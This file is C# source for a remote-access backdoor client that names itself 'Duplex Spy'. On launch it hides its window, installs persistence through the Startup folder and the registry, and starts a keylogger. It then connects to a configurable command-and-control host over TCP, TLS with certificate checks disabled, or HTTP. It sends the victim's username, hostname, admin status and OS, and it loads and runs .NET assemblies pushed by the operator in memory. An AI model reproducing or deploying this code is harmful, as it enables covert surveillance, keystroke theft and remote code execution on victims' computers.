/* .o0o.--------------[ README ]--------------.o0o.
 * # INTRODUCTION
 * DUPLEX SPY BACKDOOR CLIENT C-SHARP VERSION V1.0.0
 * AUTHOR: ISSAC
 * LANGUAGE: C#
 * 
 * # DONE
 * SEND INFORMATION
 * 
 * 
 * [ TODO LIST ]
 * KEYLOGGER
 * REMOTE PLUGIN
 * 
 * REMOTE DESKTOP
 * 
 * FILE MANAGER
 * TASK MANAGER
 * CONNECTION MANAGER
 * SERVICE MANAGER
 * WINDOW MANAGER
 * 
 * .o0o.--------------[ README ]--------------.o0o. */

using System;
using System.Text;
using System.Windows.Forms;
using System.Threading;
using System.Net.Sockets;
using System.Net;
using System.Reflection;
using System.IO;
using System.Runtime.InteropServices;
using System.Data;
using System.Management;
using System.Security.Principal;
using System.Threading.Tasks;
using System.Diagnostics;

using Payload.Common;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;

using Plugin.Abstractions48;

namespace winClient48Small
{
    public partial class Form1 : Form
    {
        private string id_prefix = "[PREFIX]";

        private Socket m_Socket;
        private bool is_connected = false;
        private string m_szIPAddr = "[IP]";
        private int m_nPort = int.Parse("[PORT]");
        private int m_nTimeout = int.Parse("[TIMEOUT]"); //ms
        private int m_nRetry = int.Parse("[RETRY]"); //ms
        private clsVictim.enProtocol m_protocol =            //C2 Protocol
            (clsVictim.enProtocol)Enum.Parse(typeof(clsVictim.enProtocol), "[PROTOCOL]");

        //HTTP
        private string m_szHost = "[HTTP_HOST]";
        private string m_szMethod = "[HTTP_METHOD]";
        private string m_szPath = "[HTTP_PATH]";
        private string m_szUA = "[HTTP_UA]";

        private bool m_bUAC = bool.Parse("[IS_UAC]");

        //Install
        private bool m_bCopyDir = bool.Parse("[IS_CP_DIR]");
        private string m_szCopyDir = "[IS_SZ_DIR]"; //Dir name (path or path variable)
        private bool m_bCopyStartUp = bool.Parse("[IS_CP_STARTUP]");
        private string m_szCopyStartUp = "[IS_SZ_STARTUP]"; //Filename
        private bool m_bReg = bool.Parse("[IS_REG]");
        private string m_szRegKeyName = "[IS_REG_KEY]"; //Registry key name

        //Misc
        private string m_szKeylogFileName = "[KL_FILE]";
        private bool m_bKeylogger = bool.Parse("True");

        private KeyLogger keylogger;
        private clsInstaller installer;

        public Form1()
        {
            InitializeComponent();
        }

        private string fnGenerateRandomStr(int nLength = 10)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            StringBuilder result = new StringBuilder(nLength);
            Random random = new Random();

            for (int i = 0; i < nLength; i++)
            {
                result.Append(chars[random.Next(chars.Length)]);
            }

            return result.ToString();
        }

        private bool fnIsAdmin()
        {
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);

            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        public static DataTable fnWmiQuery(string query)
        {
            DataTable dt = new DataTable();
            using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(query))
            {
                using (ManagementObjectCollection col = searcher.Get())
                {
                    foreach (ManagementObject obj in col)
                    {
                        DataRow dr = dt.NewRow();
                        foreach (PropertyData prop in obj.Properties)
                        {
                            if (!dt.Columns.Contains(prop.Name))
                            {
                                dt.Columns.Add(prop.Name);
                            }

                            dr[prop.Name] = prop.Value?.ToString() ?? "N/A";
                        }

                        dt.Rows.Add(dr);
                    }
                }
            }

            return dt;
        }

        private string fnGetOS()
        {
            try
            {
                DataTable dt = fnWmiQuery("SELECT Caption FROM Win32_OperatingSystem");
                string szOS = dt.Rows[0][0].ToString();

                return szOS;
            }
            catch (Exception ex)
            {
                return "Unknown";
            }
        }

        private byte[] CombineBytes(byte[] first_bytes, int first_idx, int first_len, byte[] second_bytes, int second_idx, int second_len)
        {
            byte[] bytes = null;
            using (MemoryStream ms = new MemoryStream())
            {
                ms.Write(first_bytes, first_idx, first_len);
                ms.Write(second_bytes, second_idx, second_len);
                bytes = ms.ToArray();
            }

            return bytes;
        }

        void fnTcpRecv(clsVictim v)
        {
            try
            {
                //Variable definition.
                Socket socket = v.socket;
                clsDSP dsp = null;
                int recv_len = 0;
                byte[] static_recvBuf = new byte[clsVictim.MAX_BUFFER_LENGTH];
                byte[] dynamic_recvBuf = new byte[] { };

                v.Send(1, 0, "Hello"); //Knock.

                do
                {
                    static_recvBuf = new byte[clsVictim.MAX_BUFFER_LENGTH];
                    recv_len = v.socket.Receive(static_recvBuf);
                    dynamic_recvBuf = CombineBytes(dynamic_recvBuf, 0, dynamic_recvBuf.Length, static_recvBuf, 0, recv_len);
                    if (recv_len <= 0)
                        break;
                    else if (dynamic_recvBuf.Length < clsDSP.HEADER_SIZE)
                        continue;
                    else
                    {
                        var head_info = clsDSP.GetHeader(dynamic_recvBuf);
                        while (dynamic_recvBuf.Length - clsDSP.HEADER_SIZE >= head_info.len)
                        {
                            dsp = new clsDSP(dynamic_recvBuf);
                            dynamic_recvBuf = dsp.MoreData;
                            head_info = clsDSP.GetHeader(dynamic_recvBuf);

                            if (dsp.Command == 0)
                            {
                                if (dsp.Param == 0) //DISCONNECT
                                {
                                    fnDisconnect(v);
                                }
                                else if (dsp.Param == 1) //RECONNECT (REFRESH KEY)
                                {
                                    fnReconnect(v);
                                }
                            }
                            else if (dsp.Command == 1) //KEY EXCHANGE
                            {
                                if (dsp.Param == 0) //RECEIVED RSA KEY SEND ENCRYPTED AES KEY
                                {
                                    string szRsaPublicKeyXml = clsCrypto.b64D2Str(dsp.GetMsg().msg); //XML FORMAT
                                    szRsaPublicKeyXml = clsCrypto.b64D2Str(szRsaPublicKeyXml); //Base64 decoding.

                                    v.key_pairs.public_key = szRsaPublicKeyXml; //Store RSA public key into victim object.

                                    var objAes = clsCrypto.AES_GenerateKeyAndIV(); //Generate new AES key and IV (initial vector).

                                    byte[] abAesKey = Convert.FromBase64String(objAes.key); //AES key.
                                    byte[] abAesIv = Convert.FromBase64String(objAes.iv); //AES IV.

                                    v._AES.key = abAesKey;
                                    v._AES.iv = abAesIv;

                                    string szPayload = objAes.key + "|" + objAes.iv;

                                    byte[] abEncPayload = clsCrypto.RSAEncrypt(szPayload, szRsaPublicKeyXml);

                                    v.Send(1, 1, abEncPayload);
                                }
                                else if (dsp.Param == 2) //CHALLENGE AND RESPONSE
                                {
                                    byte[] buffer = dsp.GetMsg().msg;
                                    string payload = Encoding.UTF8.GetString(buffer);
                                    buffer = Convert.FromBase64String(payload);
                                    payload = clsCrypto.AESDecrypt(buffer, v._AES.key, v._AES.iv);
                                    payload = Convert.ToBase64String(clsCrypto.RSAEncrypt(payload, v.key_pairs.public_key));
                                    payload = clsCrypto.AESEncrypt(payload, v._AES.key, v._AES.iv);

                                    v.Send(1, 3, payload);
                                }
                                else if (dsp.Param == 4)
                                {
                                    DataTable dt = fnWmiQuery("select serialnumber from win32_diskdrive");
                                    string szSerialNumber = dt.Rows[0][0].ToString().Replace(" ", string.Empty).Trim();
                                    string szOnlineID = $"{id_prefix}_{Dns.GetHostName()}_{szSerialNumber}";

                                    string szData = string.Join("|", new string[]
                                    {
                                        szOnlineID,
                                        Environment.UserName,
                                        Dns.GetHostName(),
                                        m_bKeylogger ? "Yes" : "No",
                                        fnIsAdmin() ? "Yes" : "No",
                                        fnGetOS(),
                                    });

                                    v.encSend(3, 0, szData);
                                }
                            }
                            else if (dsp.Command == 2) //COMMAND AND CONTROL
                            {
                                if (dsp.Param == 0) //RECEIVED COMMAND
                                {
                                    string payload = Encoding.UTF8.GetString(dsp.GetMsg().msg);
                                    payload = clsCrypto.AESDecrypt(Convert.FromBase64String(payload), v._AES.key, v._AES.iv);

                                    _ = Task.Run(() => CommandProc(v, payload));
                                }
                                else if (dsp.Param == 1) //PIGN TIME, LATENCY
                                {
                                    _ = Task.Run(() => v.encSend(2, 1, clsEZData.fnGenerateRandomStr()));
                                }
                            }
                        }
                    }
                }
                while (recv_len > 0 && is_connected);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
            finally
            {
                is_connected = false;
            }
        }

        void fnTlsRecv(clsVictim victim)
        {
            try
            {
                const int CMD_TLS = 1;
                const int PARA_HELLO = 0;
                const int PARA_ACK = 1;

                SslStream sslClnt = victim.m_sslClnt;
                clsDSP dsp = null;

                int nRecv = 0;
                byte[] abStaticRecvBuffer;
                byte[] abDynamicRecvBuffer = { };

                victim.fnSendCmdParam(CMD_TLS, PARA_HELLO);

                do
                {
                    abStaticRecvBuffer = new byte[clsVictim.MAX_BUFFER_LENGTH];
                    nRecv = sslClnt.Read(abStaticRecvBuffer, 0, abStaticRecvBuffer.Length);

                    if (nRecv <= 0)
                        break;

                    abDynamicRecvBuffer = CombineBytes(
                        abDynamicRecvBuffer, 0, abDynamicRecvBuffer.Length,
                        abStaticRecvBuffer, 0, nRecv);

                    while (abDynamicRecvBuffer.Length >= clsDSP.HEADER_SIZE)
                    {
                        var header = clsDSP.GetHeader(abDynamicRecvBuffer);
                        if (abDynamicRecvBuffer.Length - clsDSP.HEADER_SIZE < header.len)
                            break;

                        dsp = new clsDSP(abDynamicRecvBuffer);
                        abDynamicRecvBuffer = dsp.MoreData;

                        int cmd = header.cmd;
                        int para = header.para;
                        byte[] msg = dsp.GetMsg().msg;

                        if (cmd == 0)
                        {
                            if (para == 0)
                            {
                                fnDisconnect(victim);
                            }
                            else if (para == 1)
                            {
                                fnReconnect(victim);
                            }
                        }
                        else if (cmd == CMD_TLS)
                        {
                            if (para == 0) //Hello
                            {
                                victim.fnSendCmdParam(CMD_TLS, PARA_HELLO);
                            }
                            else if (para == PARA_ACK)
                            {
                                DataTable dt = fnWmiQuery("select serialnumber from win32_diskdrive");
                                string szSerialNumber = dt.Rows[0][0].ToString().Replace(" ", string.Empty).Trim();
                                string szOnlineID = $"{id_prefix}_{Dns.GetHostName()}_{szSerialNumber}";

                                string szData = string.Join("|", new string[]
                                {
                                    szOnlineID,
                                    Environment.UserName,
                                    Dns.GetHostName(),
                                    m_bKeylogger ? "Yes" : "No",
                                    fnIsAdmin() ? "Yes" : "No",
                                    fnGetOS(),
                                });

                                victim.fnSslSendRAW(3, 0, szData);
                            }
                        }
                        else if (cmd == 2)
                        {
                            if (para == 0)
                            {
                                string payload = Encoding.UTF8.GetString(dsp.GetMsg().msg);
                                payload = clsCrypto.AESDecrypt(Convert.FromBase64String(payload), victim._AES.key, victim._AES.iv);
                                CommandProc(victim, payload);
                            }
                            else if (para == 1)
                            {
                                _ = Task.Run(() => victim.encSend(2, 1, clsEZData.fnGenerateRandomStr()));
                            }
                        }
                    }
                }
                while (true);
            }
            catch (Exception ex)
            {
                //MessageBox.Show(ex.Message);
            }
            finally
            {
                is_connected = false;
            }
        }

        /// <summary>
        /// HTTP handler.
        /// </summary>
        /// <param name="victim"></param>
        void fnHttpRecv(clsVictim victim)
        {
            try
            {
                Socket socket = victim.socket;
                clsDSP dsp = null;
                int recv_len = 0;
                byte[] static_recvBuf = new byte[clsVictim.MAX_BUFFER_LENGTH];
                byte[] dynamic_recvBuf = new byte[] { };

                victim.fnHttpSend(1, 0, clsEZData.fnGenerateRandomStr());

                do
                {
                    static_recvBuf = new byte[clsVictim.MAX_BUFFER_LENGTH];
                    recv_len = victim.socket.Receive(static_recvBuf);
                    dynamic_recvBuf = CombineBytes(dynamic_recvBuf, 0, dynamic_recvBuf.Length, static_recvBuf, 0, recv_len);

                    if (recv_len <= 0)
                        break;
                    else if (dynamic_recvBuf.Length < clsDSP.HEADER_SIZE)
                        continue;
                    else
                    {
                        string szHttpResp = Encoding.UTF8.GetString(dynamic_recvBuf);
                        string szBody = szHttpResp.Split(new string[] { "\r\n\r\n" }, StringSplitOptions.None).Last();

                        try
                        {
                            dynamic_recvBuf = Convert.FromBase64String(szBody);
                        }
                        catch (Exception ex)
                        {

                            continue;
                        }

                        dsp = new clsDSP(dynamic_recvBuf);
                        dynamic_recvBuf = dsp.MoreData;

                        var head_info = clsDSP.GetHeader(dynamic_recvBuf);

                        if (dsp.Command == 0)
                        {
                            if (dsp.Param == 0) //DISCONNECT
                            {
                                fnDisconnect(victim);
                            }
                            else if (dsp.Param == 1) //RECONNECT (REFRESH KEY)
                            {
                                fnReconnect(victim);
                            }
                        }
                        else if (dsp.Command == 1) //KEY EXCHANGE
                        {
                            if (dsp.Param == 0) //RECEIVED RSA KEY SEND ENCRYPTED AES KEY
                            {
                                string rsa_publicKey = clsCrypto.b64D2Str(dsp.GetMsg().msg); //XML FORMAT
                                rsa_publicKey = clsCrypto.b64D2Str(rsa_publicKey);
                                victim.key_pairs.public_key = rsa_publicKey;
                                var aes = clsCrypto.AES_GenerateKeyAndIV();
                                victim._AES.key = Convert.FromBase64String(aes.key);
                                victim._AES.iv = Convert.FromBase64String(aes.iv);
                                string payload = aes.key + "|" + aes.iv;
                                byte[] enc_payload = clsCrypto.RSAEncrypt(payload, rsa_publicKey);


                                victim.fnHttpSend(1, 1, Convert.ToBase64String(enc_payload));
                            }
                            else if (dsp.Param == 2) //CHALLENGE AND RESPONSE
                            {
                                byte[] buffer = dsp.GetMsg().msg;
                                string payload = Encoding.UTF8.GetString(buffer);
                                buffer = Convert.FromBase64String(payload);
                                payload = clsCrypto.AESDecrypt(buffer, victim._AES.key, victim._AES.iv);
                                payload = Convert.ToBase64String(clsCrypto.RSAEncrypt(payload, victim.key_pairs.public_key));
                                payload = clsCrypto.AESEncrypt(payload, victim._AES.key, victim._AES.iv);
                                victim.fnHttpSend(1, 3, payload);
                            }
                            else if (dsp.Param == 4)
                            {
                                DataTable dt = fnWmiQuery("select serialnumber from win32_diskdrive");
                                string szSerialNumber = dt.Rows[0][0].ToString().Replace(" ", string.Empty).Trim();
                                string szOnlineID = $"{id_prefix}_{Dns.GetHostName()}_{szSerialNumber}";

                                string szData = string.Join("|", new string[]
                                {
                                    szOnlineID,
                                    Environment.UserName,
                                    Dns.GetHostName(),
                                    m_bKeylogger ? "Yes" : "No",
                                    fnIsAdmin() ? "Yes" : "No",
                                    fnGetOS(),
                                });

                                victim.fnHttpSend(3, 0, szData);
                            }
                        }
                        else if (dsp.Command == 2)
                        {
                            if (dsp.Param == 0)
                            {
                                string payload = Encoding.UTF8.GetString(dsp.GetMsg().msg);
                                payload = clsCrypto.AESDecrypt(Convert.FromBase64String(payload), victim._AES.key, victim._AES.iv);
                                CommandProc(victim, payload);
                            }
                            else if (dsp.Param == 1)
                            {
                                _ = Task.Run(() => victim.encSend(2, 1, clsEZData.fnGenerateRandomStr()));
                            }
                        }
                    }
                }
                while (recv_len > 0 && is_connected);
            }
            catch (Exception ex)
            {
                //MessageBox.Show(ex.Message);
            }
            finally
            {
                is_connected = false;
            }
        }

        void fnDisconnect(clsVictim victim)
        {
            if (is_connected)
            {
                try
                {
                    victim.socket.LingerState = new LingerOption(true, 0); //RST
                    victim.socket.Close();
                }
                catch
                {

                }

                is_connected = false;

                Environment.Exit(0);
            }
        }
        void fnReconnect(clsVictim victim)
        {
            if (is_connected)
            {
                try
                {
                    victim.socket.LingerState = new LingerOption(true, 0); //RST
                    victim.socket.Close();
                }
                catch
                {

                }

                is_connected = false;
            }
        }

        void CommandProc(clsVictim s, string szPayload)
        {
            try
            {
                string[] aCmd = szPayload.Split('|');
                MessageBox.Show(aCmd[0]);
                if (aCmd[0] == "dll")
                {
                    if (aCmd[1] == "ls")
                    {

                    }
                    else if (aCmd[1] == "load")
                    {

                    }
                }
                else if (aCmd[0] == "init")
                {
                    string[] aszData = clsEZData.fnStrToListStr(aCmd[1]).ToArray();
                    byte[] abExeBytes = Convert.FromBase64String(aCmd[2]);

                    Assembly loaded = Assembly.Load(abExeBytes);
                    MethodInfo entry = loaded.EntryPoint;
                    object instance = null;
                    if (!entry.IsStatic)
                        instance = loaded.CreateInstance(entry.Name);

                    entry.Invoke(instance, new object[] { aszData });

                    s.socket.Close();

                    MessageBox.Show("Load");
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        void Reconnect()
        {

        }
        void Disconnect()
        {

        }

        void Connect()
        {
            try
            {
                if (!IPAddress.TryParse(m_szIPAddr, out var address))
                {
                    try
                    {
                        IPAddress[] aAddr = Dns.GetHostAddresses(m_szIPAddr);
                        if (aAddr.Length > 0)
                        {
                            string hostName = Dns.GetHostName();
                            IPAddress[] ips = Dns.GetHostAddresses(hostName);

                            IPAddress firstIPv4 = ips.First(ip => ip.AddressFamily == AddressFamily.InterNetwork);

                            m_szIPAddr = firstIPv4.ToString();
                        }
                    }
                    catch
                    {

                    }
                }

                if (m_protocol == clsVictim.enProtocol.TCP)
                {
                    Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    socket.Connect(m_szIPAddr, m_nPort);
                    clsVictim v = new clsVictim(socket);

                    new Thread(() => fnTcpRecv(v)).Start();
                }
                else if (m_protocol == clsVictim.enProtocol.TLS)
                {
                    bool fnValidateServerCert(object sender, X509Certificate cert, X509Chain chain, SslPolicyErrors errors)
                    {
                        return true;
                    }

                    TcpClient client = new TcpClient();
                    client.Connect(m_szIPAddr, m_nPort);

                    SslStream ssl = new SslStream(client.GetStream(), false, fnValidateServerCert, null);
                    ssl.AuthenticateAsClient("dps");

                    clsVictim victim = new clsVictim(client.Client, ssl);

                    new Thread(() => fnTlsRecv(victim)).Start();
                }
                else if (m_protocol == clsVictim.enProtocol.HTTP)
                {
                    TcpClient client = new TcpClient();
                    client.Connect(m_szIPAddr, m_nPort);

                    clsVictim victim = new clsVictim(client.Client, m_szHost, m_szMethod, m_szPath, m_szUA);

                    new Thread(() => fnHttpRecv(victim)).Start();
                }

                is_connected = true;
            }
            catch (Exception ex)
            {
                //MessageBox.Show(ex.Message);
            }
        }

        void Main()
        {
            is_connected = false;
            installer = new clsInstaller();
            installer.m_szCurrentPath = Process.GetCurrentProcess().MainModule.FileName;
            installer.m_bCopyDir = m_bCopyDir;
            installer.m_szCopyPath = Environment.ExpandEnvironmentVariables(Path.Combine(m_szCopyDir, Path.GetFileName(installer.m_szCurrentPath)));
            installer.m_bStartUp = m_bCopyStartUp;
            installer.m_szStartUpName = Environment.ExpandEnvironmentVariables(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), m_szCopyStartUp));
            installer.m_bReg = m_bReg;
            installer.m_szRegKeyName = m_szRegKeyName;
            installer.m_bUAC = m_bUAC;

            installer.Start();

            keylogger = new KeyLogger(m_szKeylogFileName);
            new Thread(() => keylogger.Start()).Start();
            new Thread(() =>
            {
                while (true)
                {
                    if (!is_connected)
                    {
                        Connect();
                    }

                    Thread.Sleep(m_nRetry);
                }
            }).Start();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Visible = false;
            ShowInTaskbar = false;
            Main();
        }
    }
}